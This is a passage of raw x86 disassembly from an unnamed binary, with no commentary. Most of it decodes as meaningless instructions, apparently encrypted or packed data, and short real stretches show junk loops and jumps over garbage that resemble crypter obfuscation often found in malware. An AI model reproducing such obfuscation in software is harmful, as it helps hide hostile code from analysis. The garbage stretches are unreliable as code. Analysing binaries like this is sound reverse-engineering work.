  404abd:	fsub   QWORD PTR [ecx-0x6896b60f]
  404ac3:	repnz mov al,ds:0x4ca717cf
  404ac9:	add    esi,edx
  404acb:	inc    eax
  404acc:	loop   0x404a5e
  404ace:	mov    ch,0xce
  404ad0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ad1:	int3   
  404ad2:	cli    
  404ad3:	int3   
  404ad4:	jecxz  0x404b49
  404ad6:	jg     0x404a9d
  404ad8:	popf   
  404ad9:	jmp    0x404b52
  404adb:	adc    eax,0x4b9c939
  404ae0:	fldenv [esi-0x1c]
  404ae3:	fimul  DWORD PTR [ebp+0x721f62e9]
  404ae9:	fbstp  TBYTE PTR [edx+0x615a18ba]
  404aef:	imul   esp,DWORD PTR [eax+0x44],0x32
  404af3:	cwde   
  404af4:	sbb    esi,DWORD PTR [ebp+esi*1-0xdd9c796]
  404afb:	inc    esi
  404afc:	ja     0x404b0f
  404afe:	push   eax
  404aff:	mov    ds:0x3a811e19,eax
  404b04:	test   BYTE PTR [ebx+0x28],cl
  404b07:	or     edi,ebx
  404b09:	jae    0x404af5
  404b0b:	push   esi
  404b0c:	inc    esi
  404b0d:	xor    al,0x44
  404b0f:	add    al,0xd5
  404b11:	cmp    bh,ah
  404b13:	mov    cl,0x75
  404b15:	mov    esp,0x9eee04d1
  404b1a:	inc    eax
  404b1b:	pushf  
  404b1c:	jb     0x404b76
  404b1e:	(bad)  
  404b1f:	mov    esp,0x70c17362
  404b24:	add    DWORD PTR [ecx-0x605a6aca],ecx
  404b2a:	cmp    BYTE PTR [esi+eax*1],dl
  404b2d:	pop    esp
  404b2e:	test   DWORD PTR [edx],edx
  404b30:	dec    esp
  404b31:	inc    ecx
  404b32:	inc    edi
  404b33:	lea    esp,[edi]
  404b35:	in     al,0xce
  404b37:	repnz outs dx,BYTE PTR ds:[esi]
  404b39:	mov    al,ds:0xf70a96bb
  404b3e:	sub    dl,BYTE PTR [eax]
  404b40:	add    BYTE PTR [edi+0x79518dec],cl
  404b46:	(bad)  
  404b47:	sahf   
  404b48:	pop    eax
  404b49:	mov    WORD PTR [edi+edi*1+0x668ed4b5],fs
  404b50:	xor    al,0x8c
  404b52:	addr16 mov edx,0x6e1fb295
  404b58:	xchg   edi,eax
  404b59:	xchg   ebx,eax
  404b5a:	test   BYTE PTR [ecx],ch
  404b5c:	arpl   bx,bp
  404b5e:	xchg   esi,eax
  404b5f:	mov    eax,DWORD PTR [esi+0x8]
  404b62:	iret   
  404b63:	jns    0x404b46
  404b65:	int    0xe5
  404b67:	rcl    BYTE PTR [ecx+0x57bf9e77],1
  404b6d:	ret    0xec99
  404b70:	retf   
  404b71:	cmp    eax,DWORD PTR fs:[edi-0x19]
  404b75:	jp     0x404b5b
  404b77:	dec    eax
  404b78:	nop
  404b79:	xor    ecx,edi
  404b7b:	or     cl,BYTE PTR [eax+ebx*1-0x70]
  404b7f:	test   DWORD PTR [edx-0x52052],esi
  404b85:	mov    dl,0xf7
  404b87:	fs sbb eax,edi
  404b8a:	dec    ebx
  404b8b:	mov    cl,0x37
  404b8d:	cwde   
  404b8e:	pop    ebp
  404b8f:	aaa    
  404b90:	push   es
  404b91:	fdiv   QWORD PTR [edx+0x47ab39de]
  404b97:	loop   0x404bf6
  404b99:	adc    eax,ebx
  404b9b:	add    ebx,esi
  404b9d:	js     0x404bfe
  404b9f:	fist   WORD PTR [edi]
  404ba1:	daa    
  404ba2:	cmp    al,0x1
  404ba4:	stos   DWORD PTR es:[edi],eax
  404ba5:	inc    ebx
  404ba6:	repnz pop esp
  404ba8:	leave  
  404ba9:	cs ins BYTE PTR es:[edi],dx
  404bab:	lock add esp,DWORD PTR [eax-0xab1acc3]
  404bb2:	sar    edi,1
  404bb4:	mov    ebp,0x1185463d
  404bb9:	push   ds
  404bba:	ror    BYTE PTR [ecx+ecx*4-0x5a],0x8a
  404bbf:	mov    al,ds:0x5c8dcd75
  404bc4:	js     0x404be3
  404bc6:	mov    dl,0xb
  404bc8:	lock cmc 
  404bca:	js     0x404c24
  404bcc:	cmp    ch,BYTE PTR [ecx+0x23a5330f]
  404bd2:	(bad)  
  404bd3:	xchg   ecx,eax
  404bd4:	out    dx,eax
  404bd5:	push   0xffffffd6
  404bd7:	mov    ebx,0x1d198c7a
  404bdc:	mov    eax,0x75c5174a
  404be1:	xchg   edi,eax
  404be2:	mov    edx,0x399b28c3
  404be7:	ja     0x404b6b
  404be9:	sub    BYTE PTR [eax+0x7e],bl
  404bec:	xchg   ecx,eax
  404bed:	jp     0x404c40
  404bef:	adc    esp,DWORD PTR [esi+0x18]
  404bf2:	addr16 push es
  404bf4:	push   edi
  404bf5:	push   eax
  404bf6:	dec    esp
  404bf7:	and    al,0xfa
  404bf9:	pop    edx
  404bfa:	test   eax,0x6a496547
  404bff:	out    0x80,al
  404c01:	les    esi,FWORD PTR [esi-0x49e07780]
  404c07:	jnp    0x404c6d
  404c09:	fsub   QWORD PTR [esi]
  404c0b:	jmp    DWORD PTR [ecx+0x16]
  404c0e:	sbb    DWORD PTR [ecx],edi
  404c10:	popa   
  404c11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c12:	aam    0x2c
  404c14:	data16 stc 
  404c16:	pop    eax
  404c17:	dec    esp
  404c18:	or     ebx,DWORD PTR [eax-0x731d9cf7]
  404c1e:	inc    eax
  404c1f:	jmp    0x404c9b
  404c21:	imul   esp,DWORD PTR [ecx+0x641b3476],0x2e274ee7
  404c2b:	ins    BYTE PTR es:[edi],dx
  404c2c:	popa   
  404c2d:	fisub  WORD PTR ds:[eax+0x6e6fb5f9]
  404c34:	hlt    
  404c35:	daa    
  404c36:	dec    edx
  404c37:	pop    ecx
  404c38:	pop    edi
  404c39:	xor    DWORD PTR [esp+ebx*1],edi
  404c3c:	jge    0x404bd0
  404c3e:	popf   
  404c3f:	stos   BYTE PTR es:[edi],al
  404c40:	aas    
  404c41:	jnp    0x404c68
  404c43:	leave  
  404c44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c45:	ja     0x404c03
  404c47:	mov    ebx,0xbf26d741
  404c4c:	pop    esp
  404c4d:	jmp    0x404c21
  404c4f:	adc    ch,BYTE PTR [ebp+eax*1+0x538ac63f]
  404c56:	pushf  
  404c57:	inc    eax
  404c58:	outs   dx,DWORD PTR ds:[esi]
  404c59:	rol    esi,1
  404c5b:	popa   
  404c5c:	retf   0x967e
  404c5f:	sub    esi,edx
  404c61:	pop    eax
  404c62:	inc    ecx
  404c63:	(bad)  
  404c64:	push   ecx
  404c65:	and    DWORD PTR [ebx-0x66],edx
  404c68:	xor    cl,BYTE PTR [ebx]
  404c6a:	add    BYTE PTR [edx],0x60
  404c6d:	mov    BYTE PTR [edi-0x1b8b8fc5],dl
  404c73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c74:	frstor [ebx+0x7cad19e4]
  404c7a:	cdq    
  404c7b:	mov    DWORD PTR [esi-0x22],edx
  404c7e:	fild   QWORD PTR [ebx-0x14]
  404c81:	or     ebp,0x6b
  404c84:	dec    ecx
  404c85:	dec    esp
  404c86:	inc    esp
  404c88:	js     0x404cc7
  404c8a:	push   edi
  404c8b:	and    edx,ecx
  404c8d:	ficom  DWORD PTR [esi+0x1f]
  404c90:	sub    ebp,DWORD PTR [esi-0x1a]
  404c93:	xor    BYTE PTR [esi-0x4a],0x46
  404c97:	inc    esp
  404c98:	jb     0x404c95
  404c9a:	pop    edi
  404c9b:	jnp    0x404cbe
  404c9d:	retf   0xd781
  404ca0:	xlat   BYTE PTR ds:[ebx]
  404ca1:	sbb    al,BYTE PTR [ecx+0x505e8b8e]
  404ca7:	xchg   bh,ch
  404ca9:	push   eax
  404caa:	and    ecx,DWORD PTR [ebx+0x2fbfd2cf]
  404cb0:	fmul   st,st(6)
  404cb2:	and    al,bh
  404cb4:	call   0x8bd3:0xd1aae986
  404cbb:	fldcw  WORD PTR [esi-0x1f]
  404cbe:	jb     0x404c77
  404cc0:	mov    al,ds:0x98cb6d99
  404cc5:	pop    ebp
  404cc6:	cmc    
  404cc7:	sbb    DWORD PTR [ebx-0x20b32ac5],ebp
  404ccd:	outs   dx,BYTE PTR ds:[esi]
  404cce:	aas    
  404ccf:	nop
  404cd0:	hlt    
  404cd1:	push   esi
  404cd2:	mov    ebx,0xa1337633
  404cd7:	mov    eax,0x2a2ea69d
  404cdc:	mov    BYTE PTR [esi],bh
  404cde:	cmp    dh,BYTE PTR [ebp-0x3b]
  404ce1:	mov    edx,0xfb354f54
  404ce6:	in     eax,dx
  404ce7:	enter  0x7889,0x39
  404ceb:	cmp    ch,al
  404ced:	shl    BYTE PTR [ebx-0x47],0xe
  404cf1:	cmc    
  404cf2:	jno    0x404cf2
  404cf4:	sub    al,0x5a
  404cf6:	and    bh,BYTE PTR [edi-0x6f134ac7]
  404cfc:	fdivr  DWORD PTR [edx+0x2d0f40b1]
  404d02:	outs   dx,DWORD PTR ds:[esi]
  404d03:	xlat   BYTE PTR ds:[ebx]
  404d04:	int3   
  404d05:	cs ret 
  404d07:	mov    bh,0x50
  404d09:	fidiv  WORD PTR ds:0x18b0e060
  404d0f:	cli    
  404d10:	test   BYTE PTR [eax+0x2d64cb5],0x3b
  404d17:	stos   DWORD PTR es:[edi],eax
  404d18:	push   esi
  404d19:	jecxz  0x404cdc
  404d1b:	pop    edx
  404d1c:	xchg   esi,eax
  404d1d:	cmc    
  404d1e:	pop    es
  404d1f:	and    DWORD PTR [ebx-0x77680ec0],ebp
  404d25:	loope  0x404ce6
  404d27:	call   0x248e5079
  404d2c:	xchg   edx,eax
  404d2d:	and    cl,BYTE PTR [esi+0x32]
  404d30:	in     eax,0x48
  404d32:	xor    BYTE PTR [eax],0x96
  404d35:	and    bh,dh
  404d37:	icebp  
  404d38:	mov    ecx,DWORD PTR [ebp+0x10]
  404d3b:	and    ecx,eax
  404d3d:	or     ecx,0x81161d8f
  404d43:	mov    eax,ecx
  404d45:	pop    ebp
  404d46:	ret    0x18
  404d49:	push   ebp
  404d4a:	mov    ebp,esp
  404d4c:	jmp    0x404f59
  404d51:	pop    ds
  404d52:	iret   
  404d53:	xchg   edi,eax
  404d54:	cmp    DWORD PTR [edi+0x41],esi
  404d57:	jno    0x404d42
  404d59:	das    
  404d5a:	ins    BYTE PTR es:[edi],dx
  404d5b:	xchg   esp,eax
  404d5c:	mov    eax,0xd72ef66
  404d61:	out    0x20,al
  404d63:	jle    0x404de3
  404d65:	outs   dx,BYTE PTR ds:[esi]
  404d66:	jg     0x404de6
  404d68:	jle    0x404d74
  404d6a:	sub    BYTE PTR [esi-0x58],0x61
  404d6e:	and    DWORD PTR [ecx],esi
  404d70:	sbb    edi,DWORD PTR [esi]
  404d72:	inc    ecx
  404d73:	sub    DWORD PTR [ebx+ebp*2],ebx
  404d76:	dec    ebx
  404d77:	out    dx,eax
  404d78:	fild   WORD PTR [ecx-0x2b]
  404d7b:	fiadd  WORD PTR [eax+0x41ffaaa8]
  404d81:	mov    dh,0x4
  404d83:	clc    
  404d84:	fwait
  404d85:	das    
  404d86:	out    dx,eax
  404d87:	outs   dx,DWORD PTR ds:[esi]
  404d88:	jnp    0x404d45
  404d8a:	adc    ecx,0xc68f8133
  404d90:	cmp    dh,bl
  404d92:	jmp    0xcac9:0x13f7eb79
  404d99:	fsubr  DWORD PTR [ebx+0x7b]
  404d9c:	mov    dl,0x81
  404d9e:	and    ebp,DWORD PTR [ebp-0x31b86f3d]
  404da4:	push   cs
  404da5:	mov    edi,0x6aeeaf1
  404daa:	push   es
  404dab:	ss fwait
  404dad:	out    dx,al
  404dae:	jno    0x404dcc
  404db0:	jo     0x404dfc
  404db2:	cmp    esp,DWORD PTR [ebx-0x2b]
  404db5:	mov    esp,0x2322821b
  404dba:	xchg   ecx,eax
  404dbb:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  404dbd:	sbb    DWORD PTR [edx-0x1f],ecx
  404dc0:	aad    0x46
  404dc2:	cmp    bh,BYTE PTR [edi+0x62]
  404dc5:	popf   
  404dc6:	fs loop 0x404d54
  404dc9:	push   esi
  404dca:	rol    DWORD PTR ds:0x5a67f860,1
  404dd0:	jne    0x404dc1
  404dd2:	xchg   ebp,eax
  404dd3:	sub    BYTE PTR [esi+0x75],bl
  404dd6:	jle    0x404d9a
  404dd8:	push   ss
  404dd9:	add    DWORD PTR [eax],edx
  404ddb:	int    0xf8
  404ddd:	call   0x57238793
  404de2:	dec    ebp
  404de3:	push   0xa33ee046
  404de8:	icebp  
  404de9:	adc    ecx,DWORD PTR [ebx+0x1966dcac]
  404def:	mov    esi,0xf2f95c1d
  404df4:	and    esi,DWORD PTR [ecx]
  404df6:	ret    0x79b5
  404df9:	ins    DWORD PTR es:[edi],dx
  404dfa:	clc    
  404dfb:	mov    ch,0x30
  404dfd:	add    al,0xc9
  404dff:	scas   al,BYTE PTR es:[edi]
  404e00:	mov    ds:0x21153494,al
  404e05:	in     eax,0xa4
  404e07:	xchg   edi,eax
  404e08:	xlat   BYTE PTR ds:[ebx]
  404e09:	mov    dh,0x81
  404e0b:	push   cs
  404e0c:	jns    0x404e72
  404e0e:	test   DWORD PTR [edi+0x3c4583b0],esp
  404e14:	add    dl,BYTE PTR [esi+0x30fd281f]
  404e1a:	pop    ecx
  404e1b:	ds adc esp,ebp
  404e1e:	data16 cmp ch,dl
  404e21:	and    ebx,DWORD PTR [ebx-0x2927b8d9]
  404e27:	sbb    esi,ecx
  404e29:	scas   eax,DWORD PTR es:[edi]
  404e2a:	push   edi
  404e2b:	mov    dh,0xb4
  404e2d:	inc    esp
  404e2e:	or     al,0x4e
  404e30:	repnz and al,0xa5
  404e33:	ins    BYTE PTR es:[edi],dx
  404e34:	inc    eax
  404e35:	cwde   
  404e36:	mov    al,ds:0x7d3161a7
  404e3b:	sbb    bh,BYTE PTR [edi]
  404e3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e3e:	or     eax,0xd023f1c1
  404e43:	jns    0x404de1
  404e45:	mov    gs,WORD PTR [ebp+0x150b9021]
  404e4b:	xchg   esp,eax
  404e4c:	inc    esi
  404e4d:	cmp    dl,bh
  404e4f:	jmp    0x125b77cd
  404e54:	call   0xd6d038e0
  404e59:	sbb    DWORD PTR [edx+0x64],ecx
  404e5c:	sbb    al,0x51
  404e5e:	sub    ebp,edx
  404e60:	mov    dl,0x3e
  404e62:	inc    edi
  404e63:	push   ss
  404e64:	jb     0x404e02
  404e66:	mov    ch,0xb9
  404e68:	lock cli 
  404e6a:	test   eax,0x2eef12e1
  404e6f:	cld    
  404e70:	sub    bh,BYTE PTR [eax+0x79]
  404e73:	mov    edi,ds
  404e75:	pop    edi
  404e76:	mov    al,ds:0xdb46e9bd
  404e7b:	ss enter 0x2f5b,0x62
  404e80:	mov    bh,BYTE PTR [edx-0x6ba02fd2]
  404e86:	lahf   
  404e87:	xchg   edx,eax
  404e88:	out    dx,eax
  404e89:	(bad)  
  404e8a:	and    ch,ch
  404e8c:	adc    DWORD PTR [ebp+0x44],ebp
  404e8f:	in     eax,0xeb
  404e91:	cmp    BYTE PTR ds:0x6844323b,dl
  404e97:	scas   al,BYTE PTR es:[edi]
  404e98:	ret    
  404e99:	jnp    0x404e74
  404e9b:	add    eax,DWORD PTR [ecx]
  404e9d:	pop    ebx
  404e9e:	mov    bl,0x4c
  404ea0:	mov    ds:0x48848992,al
  404ea5:	push   ebx
  404ea6:	sub    bl,ah
  404ea8:	cmp    ch,BYTE PTR [esi+0x6c989a94]
  404eae:	aad    0x3f
  404eb0:	xchg   edx,eax
  404eb1:	jge    0x404eb5
  404eb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404eb4:	mov    dh,BYTE PTR [edi+0x67489c29]
  404eba:	or     eax,0x521ff67d
  404ebf:	xchg   edi,eax
  404ec0:	ror    esp,cl
  404ec2:	mov    ebx,0xce03d899
  404ec7:	or     DWORD PTR [esi],eax
  404ec9:	cmp    eax,0xd8e7981e
  404ece:	cli    
  404ecf:	fmul   st,st(5)
  404ed1:	test   al,0x60
  404ed3:	mov    ds:0x7743bf5a,eax
  404ed8:	js     0x404e67
  404eda:	retf   
  404edb:	sub    BYTE PTR [eax-0x3d],bh
  404ede:	dec    edx
  404edf:	xchg   esi,eax
  404ee0:	outs   dx,DWORD PTR ds:[esi]
  404ee1:	cdq    
  404ee2:	mov    ecx,0x4069f077
  404ee7:	xor    BYTE PTR [ecx+0x2f196c05],dl
  404eed:	xchg   edi,eax
  404eee:	retf   
  404eef:	and    eax,0xc6202877
  404ef4:	push   edx
  404ef5:	sub    DWORD PTR [edi-0x3e],ebx
  404ef8:	(bad)  
  404ef9:	fs and al,0xe
  404efc:	test   BYTE PTR [edx+0x37],cl
  404eff:	shr    BYTE PTR [ebp+0x814e373],cl
  404f05:	dec    ecx
  404f06:	test   DWORD PTR [esi],edx
  404f08:	es cld 
  404f0a:	dec    ecx
  404f0b:	sub    al,0xb9
  404f0d:	sub    BYTE PTR [ecx],dh
  404f0f:	iret   
  404f10:	jl     0x404ea8
  404f12:	add    al,0x3b
  404f14:	imul   edx,ebx,0x66105286
  404f1a:	push   edi
  404f1b:	fwait
  404f1c:	mov    ds:0x30186110,al
  404f21:	sbb    DWORD PTR [ebx],0xeaec17da
  404f27:	retf   0x2152
  404f2a:	fs pop ss
  404f2c:	mov    ebp,0x7174820a
  404f31:	mov    ecx,0x89224b90
  404f36:	in     eax,0xab
  404f38:	sub    eax,0xd2ed4b43
  404f3d:	int    0xa
  404f3f:	push   ebx
  404f40:	aad    0x44
  404f42:	dec    esi
  404f43:	mov    esp,DWORD PTR [ecx]
  404f45:	and    eax,0x19907aad
  404f4a:	cmp    esp,DWORD PTR [ecx-0x3c63e949]
  404f50:	sub    al,0xd6
  404f52:	push   edx
  404f53:	push   edi
  404f54:	pop    ds
  404f55:	jge    0x404f75
  404f57:	or     edi,ecx
  404f59:	push   ecx
  404f5a:	and    DWORD PTR ds:0x430459,0x0
  404f64:	jmp    0x404f74
  404f69:	mov    eax,ds:0x430459
  404f6e:	inc    eax
  404f6f:	mov    ds:0x430459,eax
  404f74:	cmp    DWORD PTR ds:0x430459,0x15
  404f7b:	jae    0x404fbb
  404f81:	cmp    DWORD PTR ds:0x430459,0x17
  404f88:	jne    0x404fa4
  404f8e:	push   0x42e7d4
  404f93:	push   DWORD PTR [ebp-0x10]
  404f96:	push   0x32cc
  404f9b:	push   DWORD PTR [ebp-0x24]
  404f9e:	call   DWORD PTR ds:0x42ea9f
  404fa4:	jmp    0x404f69
  404fa9:	mov    edx,DWORD PTR ds:0x42edd7
  404faf:	xor    edx,DWORD PTR ds:0x430451
  404fb5:	mov    DWORD PTR ds:0x42edd7,edx
  404fbb:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  404fc2:	mov    edx,DWORD PTR ds:0x42ee69
  404fc8:	mov    eax,ds:0x42e983
  404fcd:	sub    eax,edx
  404fcf:	and    edx,DWORD PTR [edx+eax*1]
  404fd2:	mov    eax,DWORD PTR [ebp-0x4]
  404fd5:	movzx  ecx,WORD PTR ds:0x42e7d8
  404fdc:	sub    ecx,DWORD PTR ds:0x43044d
  404fe2:	mov    DWORD PTR ds:0x42e7d8,ecx
  404fe8:	mov    edx,DWORD PTR [ebp+0x10]
  404feb:	and    DWORD PTR ds:0x42edf3,0x0
  404ff5:	mov    ecx,DWORD PTR ds:0x42edf3
  404ffb:	inc    ecx
  404ffc:	mov    DWORD PTR ds:0x42edf3,ecx
  405002:	cmp    DWORD PTR ds:0x42edf3,0x7
  405009:	jne    0x405018
  40500f:	push   DWORD PTR [ebp-0x28]
  405012:	call   DWORD PTR ds:0x42e9d3
  405018:	cmp    DWORD PTR ds:0x42edf3,0x6
  40501f:	jne    0x405034
  405025:	xor    ecx,ecx
  405027:	or     ecx,DWORD PTR ds:0x42edf3
  40502d:	inc    ecx
  40502e:	mov    DWORD PTR ds:0x42edf3,ecx
  405034:	cmp    DWORD PTR ds:0x42edf3,0x1e
  40503b:	jb     0x404ff5
  405041:	jmp    0x40524e
  405046:	inc    eax
  405047:	jo     0x405063
  405049:	xor    BYTE PTR [edx],ch
  40504b:	jo     0x40509d
  40504d:	jo     0x40502d
  40504f:	shl    BYTE PTR [eax],1
  405051:	outs   dx,BYTE PTR ds:[esi]
  405052:	push   ecx
  405053:	mov    DWORD PTR [eax+0x7e2ed64b],edi
  405059:	jle    0x4050c9
  40505b:	jg     0x4050db
  40505d:	jle    0x4050a5
  40505f:	out    dx,al
  405060:	mov    DWORD PTR [edi+0x3e],esp
  405063:	jl     0x405048
  405065:	into   
  405066:	or     BYTE PTR [ebp-0x2b7dbc74],ah
  40506c:	xor    cl,dh
  40506e:	ins    BYTE PTR es:[edi],dx
  40506f:	pusha  
  405070:	lahf   
  405071:	aam    0xb6
  405073:	add    cl,BYTE PTR [eax-0x4]
  405076:	pop    ss
  405077:	add    BYTE PTR [esi-0x41679166],cl
  40507d:	imul   edx,DWORD PTR [ebp+0x51],0x3e
  405081:	cmp    DWORD PTR [ebx+0x7],0xab41fe84
  405088:	loope  0x405025
  40508a:	cmp    BYTE PTR [ebp+0x7de1131f],al
  405090:	jbe    0x405052
  405092:	imul   esi,DWORD PTR [ebp*4+0x442a663b],0x2beb8cfa
  40509d:	add    eax,0xff4eb3b8
  4050a2:	and    bl,BYTE PTR [esi-0x7f]
  4050a5:	aam    0x9e
  4050a7:	lahf   
  4050a8:	pusha  
  4050a9:	xor    ebp,ecx
  4050ab:	fst    QWORD PTR [ebp+0x42]
  4050ae:	fwait
  4050af:	xchg   edx,eax
  4050b0:	xchg   edi,eax
  4050b1:	push   ebx
  4050b2:	out    dx,al
  4050b3:	out    0xdb,al
  4050b5:	ret    
  4050b6:	mov    eax,0x111f8449
  4050bb:	xor    DWORD PTR [ebx],edx
  4050bd:	xchg   edi,eax
  4050be:	je     0x4050f4
  4050c0:	retf   
  4050c1:	ja     0x4050a7
  4050c3:	adc    ebp,DWORD PTR [esi+0x1b9e0c26]
  4050c9:	dec    edx
  4050ca:	add    DWORD PTR [ecx-0x3e],edx
  4050cd:	add    BYTE PTR fs:[edx],ch
  4050d0:	jecxz  0x405132
  4050d2:	adc    BYTE PTR [eax],ah
  4050d4:	dec    esi
  4050d5:	jl     0x4050ea
  4050d7:	enter  0xf7fe,0x0
  4050db:	jno    0x405132
  4050dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050de:	arpl   WORD PTR [edi],ax
  4050e0:	mov    ebp,0xae748c1c
  4050e5:	sti    
  4050e6:	les    edx,FWORD PTR [edi-0x45]
  4050e9:	xor    ebx,ecx
  4050eb:	ins    BYTE PTR es:[edi],dx
  4050ec:	addr16 loopne 0x4050e6
  4050ef:	jo     0x40512b
  4050f1:	cmp    ch,dl
  4050f3:	push   0x44
  4050f5:	(bad)  
  4050f6:	stc    
  4050f7:	aas    
  4050f8:	mov    WORD PTR [ecx],?
  4050fa:	push   esi
  4050fb:	sbb    BYTE PTR [ebp+0x3e3c5e19],cl
  405101:	mov    ds:0x20a2ddbc,al
  405106:	mov    dl,bl
  405108:	aas    
  405109:	xchg   edx,eax
  40510a:	rcl    DWORD PTR [ecx+edi*1],1
  40510d:	mov    eax,0xb7a9888c
  405112:	xchg   esp,eax
  405113:	fistp  WORD PTR [edx-0x45]
  405116:	push   ecx
  405117:	jnp    0x40511e
  405119:	mov    al,al
  40511b:	add    DWORD PTR [eax-0x129b2490],ebx
  405121:	pop    es
  405122:	jb     0x535c584c
  405128:	sub    al,0xb
  40512a:	push   0x44
  40512c:	mov    ecx,0x7e6e3591
  405131:	lock add esi,DWORD PTR [eax-0x193fc6b9]
  405138:	cmp    ebp,DWORD PTR [ecx-0x5585c8f1]
  40513e:	xor    esi,edx
  405140:	std    
  405141:	fs scas al,BYTE PTR es:[edi]
  405143:	test   BYTE PTR [eax+0x4f],al
  405146:	jo     0x4050fa
  405148:	sti    
  405149:	jo     0x40519e
  40514b:	lahf   
  40514c:	js     0x4050ff
  40514e:	ret    0x58bc
  405151:	cwde   
  405152:	retf   0x7c50
  405155:	mov    esi,0xd36593e9
  40515a:	push   es
  40515b:	out    0xc6,eax
  40515d:	dec    ebp
  40515e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40515f:	js     0x4051aa
  405161:	push   edi
  405162:	sub    al,0x23
  405164:	xchg   edi,eax
  405165:	or     esp,DWORD PTR [eax-0x70]
  405168:	scas   eax,DWORD PTR es:[edi]
  405169:	pop    ecx
  40516a:	inc    esi
  40516b:	sbb    dh,BYTE PTR [edi]
  40516d:	retf   
  40516e:	xchg   edi,eax
  40516f:	jl     0x405107
  405171:	add    DWORD PTR [eax],esi
  405173:	push   edx
  405174:	mov    edx,0xf0147c6a
  405179:	pop    ecx
  40517a:	mov    eax,0xd418ca40
  40517f:	shl    DWORD PTR [ecx-0x21],cl
  405182:	fs dec ecx
  405184:	xlat   BYTE PTR ds:[ebx]
  405185:	jb     0x405205
  405187:	pop    edi
  405188:	(bad)  
  405189:	imul   esp,DWORD PTR [edi+eax*1-0x52ba545e],0xffffffcf
  405191:	jg     0x4051b1
  405193:	sbb    BYTE PTR [esp+eax*1+0x2356be1a],ch
  40519a:	retf   0x16a8
  40519d:	pop    es
  40519e:	adc    eax,0x56bd7f9a
  4051a3:	in     eax,0xb0
  4051a5:	sbb    BYTE PTR [ecx-0x29c6c624],dl
  4051ab:	cmp    DWORD PTR [ebx+0x32028fea],esi
  4051b1:	add    dh,BYTE PTR [eax+0x3d]
  4051b4:	sbb    bl,bh
  4051b6:	add    al,BYTE PTR [edx]
  4051b8:	aam    0xdb
  4051ba:	sbb    eax,0xabcac299
  4051bf:	loope  0x405153
  4051c1:	jnp    0x4051fc
  4051c3:	pop    edi
  4051c4:	adc    al,0xae
  4051c6:	cld    
  4051c7:	fldenv [ecx-0x44dd3070]
  4051cd:	dec    eax
  4051ce:	(bad)  
  4051cf:	in     al,dx
  4051d0:	fadd   QWORD PTR [ecx+0x3c]
  4051d3:	push   ds
  4051d4:	shl    BYTE PTR [ebp+ecx*1+0x7a0a65b3],1
  4051db:	dec    esp
  4051dc:	xor    al,0xba
  4051de:	inc    eax
  4051df:	adc    esp,ebx
  4051e1:	out    dx,eax
  4051e2:	xor    bl,bh
  4051e4:	add    ebp,ebx
  4051e6:	aas    
  4051e7:	sbb    al,0xe8
  4051e9:	and    ch,bh
  4051eb:	jae    0x405207
  4051ed:	call   0x4e15:0xd1d7a1e8
  4051f4:	adc    al,bl
  4051f6:	jo     0x405186
  4051f8:	repnz loop 0x405196
  4051fb:	dec    ebx
  4051fc:	mov    esi,0x546165a7
  405201:	xlat   BYTE PTR ds:[ebx]
  405202:	and    ch,ch
  405204:	call   0x34a54789
  405209:	cmp    ah,BYTE PTR [esi-0x2]
  40520c:	sub    BYTE PTR [ebp-0x433558af],ch
  405212:	sbb    ah,dl
  405214:	adc    edx,eax
  405216:	sbb    cl,cl
  405218:	jle    0x4051be
  40521a:	xchg   edi,eax
  40521b:	pop    es
  40521c:	dec    edi
  40521d:	push   esp
  40521e:	or     DWORD PTR [eax+eiz*4],eax
  405221:	adc    dh,BYTE PTR [ebx+0x79ff353f]
  405227:	mov    ds:0x187e283,al
  40522c:	add    al,0x15
  40522e:	gs mov ebx,0x72d33af5
  405234:	rcr    al,cl
  405236:	in     al,dx
  405237:	push   es
  405238:	xor    dl,BYTE PTR [ecx]
  40523a:	adc    ecx,DWORD PTR [edi-0x50052872]
  405240:	xchg   ah,ch
  405242:	rcr    DWORD PTR [edi+0x0],cl
  405245:	xchg   edi,eax
  405246:	iret   
  405247:	aam    0xee
  405249:	mov    ebx,0xcf6ba1c4
  40524e:	mov    ecx,0x7510854
  405253:	xor    eax,ecx
  405255:	add    eax,0x32729b
  40525a:	mov    DWORD PTR [edx],eax
  40525c:	mov    eax,DWORD PTR [ebp+0x14]
  40525f:	mov    edx,DWORD PTR [ebp+0x10]
  405262:	mov    DWORD PTR [edx+0x4],eax
  405265:	mov    eax,DWORD PTR [ebp+0x18]
  405268:	mov    edx,DWORD PTR [ebp+0x10]
  40526b:	jmp    0x405478
  405270:	sar    DWORD PTR [edx+ebp*4],cl
  405273:	push   ebp
  405274:	mov    cl,0x71
  405276:	icebp  
  405277:	mov    eax,0xd68c6305
  40527c:	xchg   ecx,eax
  40527d:	mov    ebp,0x2cc62983
  405282:	jle    0x405302
  405284:	outs   dx,BYTE PTR ds:[esi]
  405285:	jg     0x405305
  405287:	jle    0x4052e4
  405289:	inc    ebp
  40528a:	outs   dx,BYTE PTR ds:[esi]
  40528b:	lods   al,BYTE PTR ds:[esi]
  40528c:	dec    ebx
  40528d:	or     DWORD PTR [edi],ebx
  40528f:	xchg   esp,eax
  405290:	loopne 0x40525f
  405292:	cmp    DWORD PTR [esi-0x27],eax
  405295:	retf   
  405296:	or     BYTE PTR [ebp-0x531dec98],0x3c
  40529d:	add    eax,0x5f60df1a
  4052a2:	sub    edi,ebp
  4052a4:	xchg   BYTE PTR [ebx+0x5f0da782],ch
  4052aa:	dec    ecx
  4052ab:	inc    edx
  4052ac:	stos   BYTE PTR es:[edi],al
  4052ad:	or     eax,0x5c6a4b9c
  4052b2:	repnz fisttp QWORD PTR [ebx-0x4d]
  4052b6:	shr    BYTE PTR ds:0x7392f843,cl
  4052bc:	mov    cl,0x3b
  4052be:	mov    DWORD PTR ds:0x86d2b128,esi
  4052c4:	dec    ebx
  4052c5:	mov    ?,WORD PTR [edx]
  4052c7:	mov    esi,0x13d50717
  4052cc:	inc    edx
  4052cd:	xchg   esp,eax
  4052ce:	pusha  
  4052cf:	inc    edi
  4052d0:	pop    es
  4052d1:	clc    
